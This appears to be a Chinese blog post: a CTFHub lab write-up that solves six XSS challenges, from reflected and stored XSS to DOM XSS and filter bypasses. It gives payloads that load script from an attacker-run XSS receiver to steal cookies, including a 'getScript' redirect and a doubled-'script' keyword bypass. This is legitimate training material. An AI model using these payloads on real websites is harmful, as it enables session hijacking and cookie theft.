<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CTFHub技能树web之XSS - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/55259f44fcac7f77a326631046ebd718/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="CTFHub技能树web之XSS">
  <meta property="og:description" content="在XSS系列的题目中，由于需要使用能够接受XSS数据的平台，并且由于使用的是CTFHub的模拟机器人点击我们的虚假URL，因此使用的XSS平台不能是自己本地搭建的，如果是本地的模拟点击的机器人将无法访问我们给的这个URL地址，也就无法接收到我们想要的数据了，因此想解决本系列的题目，可以通过在线XSS平台或者自己使用服务器搭建一个XSS平台。
由于在线XSS平台需要收费，想起自己有一个一直没用的阿里云轻量服务器，就自己搭建了一个XSS平台。如果想做这个系列的题目，可以自己搭建一个XSS接受平台或者是用在线的平台。
第一题：反射型
首先验证是否存在XSS漏洞，在上面的框中输入，页面正常回显，说明存在XSS漏洞利用
使用蓝莲花BLUE-LOTUS的XSS接收平台能够生成payload，直接复制粘贴到第一个框中并上传，将上传后的url复制粘贴到第二个框中并点击上传，就可以收到XSS的数据了，flag就在cookie中
第二题：存储型
打开靶场，和第一题一样将payload粘贴到第一个框中并点击上传
上传后将当前url粘贴到第二个框中，点击发送
在XSS平台接收面板中即可看到数据内容，flag仍然在cookie中
第三题： DOM反射
根据第一个框中的内容在源码中查看对应的位置
可以看到可控的位置在53-55行中的这个位置，先闭合前面的单引号和&lt;script&gt;，然后再用一个&lt;script&gt;输入XSS代码，构造语句如下&#39;;&lt;/script&gt;&lt;script src=http://xx.xx.xx.xx/xss/myjs/default.js//
第四题：DOM跳转
根据题目代码分析，当传入的参数为jumpto的时候会跳转到相应的页面，利用
javascript:$.getScript语法可以传入自己的XSS平台地址实现XSS，构造语句如下 ?jumpto=javascript:$.getScript(&#34;//xx.xx//xx&#34;) 第五题：过滤空格
将payload中空格用/**/代替，即可成功XSS
第六题：过滤关键词
可以使用经典的双写绕过方法进行绕过
&lt;script src=&#34;http://xx.xx.xx.xx/xss/myjs/default.js&#34;&gt;&lt;/script&gt;
改为&lt;sscriptcript src=&#34;http://xx.xx.xx.xx/xss/myjs/default.js&#34;&gt;&lt;/sscriptcript&gt;，当开头和结尾的script被检测出并删除后剩下的字母仍然可以拼成一个script并实现XSS">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-02-26T15:26:49+08:00">
    <meta property="article:modified_time" content="2024-02-26T15:26:49+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CTFHub技能树web之XSS</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>在XSS系列的题目中，由于需要使用能够接受XSS数据的平台，并且由于使用的是CTFHub的模拟机器人点击我们的虚假URL，因此使用的XSS平台不能是自己本地搭建的，如果是本地的模拟点击的机器人将无法访问我们给的这个URL地址，也就无法接收到我们想要的数据了，因此想解决本系列的题目，可以通过在线XSS平台或者自己使用服务器搭建一个XSS平台。</p> 
<p>由于在线XSS平台需要收费，想起自己有一个一直没用的阿里云轻量服务器，就自己搭建了一个XSS平台。如果想做这个系列的题目，可以自己搭建一个XSS接受平台或者是用在线的平台。</p> 
<p>第一题：反射型</p> 
<p>首先验证是否存在XSS漏洞，在上面的框中输入，页面正常回显，说明存在XSS漏洞利用</p> 
<p><img alt="" height="288" src="https://images2.imgbox.com/59/d1/h9UffT67_o.png" width="1200"></p> 
<p> 使用蓝莲花BLUE-LOTUS的XSS接收平台能够生成payload，直接复制粘贴到第一个框中并上传，将上传后的url复制粘贴到第二个框中并点击上传，就可以收到XSS的数据了，flag就在cookie中</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/0e/5b/cJhumK3b_o.png" width="1200"></p> 
<p></p> 
<p>第二题：存储型</p> 
<p>打开靶场，和第一题一样将payload粘贴到第一个框中并点击上传</p> 
<p><img alt="" height="693" src="https://images2.imgbox.com/58/4d/mzAE3cZT_o.png" width="1200">上传后将当前url粘贴到第二个框中，点击发送</p> 
<p><img alt="" height="691" src="https://images2.imgbox.com/a5/2a/9kttZr9o_o.png" width="1200">在XSS平台接收面板中即可看到数据内容，flag仍然在cookie中</p> 
<p><img alt="" height="657" src="https://images2.imgbox.com/0d/00/0gsrmWPa_o.png" width="1200"></p> 
<p></p> 
<p>第三题： DOM反射</p> 
<p>根据第一个框中的内容在源码中查看对应的位置</p> 
<p><img alt="" height="734" src="https://images2.imgbox.com/96/97/dvHqz9op_o.png" width="1200"></p> 
<p><img alt="" height="76" src="https://images2.imgbox.com/f1/bc/VztiKtjq_o.png" width="644"></p> 
<p>可以看到可控的位置在53-55行中的这个位置，先闭合前面的单引号和&lt;script&gt;，然后再用一个&lt;script&gt;输入XSS代码，构造语句如下';&lt;/script&gt;&lt;script src=<a href="http://47.109.32.151/xss/myjs/default.js" rel="nofollow" title="http://xx.xx.xx.xx/xss/myjs/default.js">http://xx.xx.xx.xx/xss/myjs/default.js</a><a href="http://xsscom.com//He7bc3" rel="nofollow" title="http://xsscom.com//He7bc3&gt;"></a>//</p> 
<p><img alt="" height="820" src="https://images2.imgbox.com/39/20/7hvMiOGk_o.png" width="1200"></p> 
<p></p> 
<p>第四题：DOM跳转</p> 
<p><img alt="" height="154" src="https://images2.imgbox.com/82/52/IQCzXTaz_o.png" width="695"></p> 
<p>根据题目代码分析，当传入的参数为jumpto的时候会跳转到相应的页面，利用</p> 
<pre id="lss9E">javascript:$.getScript语法可以传入自己的XSS平台地址实现XSS，构造语句如下
?jumpto=javascript:$.getScript("//xx.xx//xx")</pre> 
<p>第五题：过滤空格</p> 
<p>将payload中空格用/**/代替，即可成功XSS</p> 
<p></p> 
<p>第六题：过滤关键词</p> 
<p>可以使用经典的双写绕过方法进行绕过</p> 
<p>&lt;script src="http://xx.xx.xx.xx/xss/myjs/default.js"&gt;&lt;/script&gt;</p> 
<p>改为&lt;sscriptcript src="http://xx.xx.xx.xx/xss/myjs/default.js"&gt;&lt;/sscriptcript&gt;，当开头和结尾的script被检测出并删除后剩下的字母仍然可以拼成一个script并实现XSS</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/fe1d0fc61bf99b63b5b126e60d651270/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">nginx.conf配置文件详解、案例，Nginx常用命令与模块</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a5886224687bdaeef51cdeefdee618ab/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">电子科技大学-数据库系统-期末汇总-完全体（概念&#43;图片&#43;习题&#43;代码）</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>